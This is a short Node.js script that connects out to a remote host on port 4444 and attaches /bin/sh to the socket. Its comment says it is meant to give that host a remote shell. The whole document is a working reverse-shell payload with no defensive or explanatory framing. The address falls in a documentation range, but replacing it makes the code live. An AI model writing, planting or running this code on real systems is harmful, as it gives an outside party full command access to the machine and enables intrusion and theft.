const net = require('node:net');
const { spawn } = require('node:child_process');

// Connect back to a remote host and attach a shell to the socket.
const socket = net.connect(4444, '203.0.113.40', () => {
  const shell = spawn('/bin/sh', []);
  socket.pipe(shell.stdin);
  shell.stdout.pipe(socket);
  shell.stderr.pipe(socket);
});
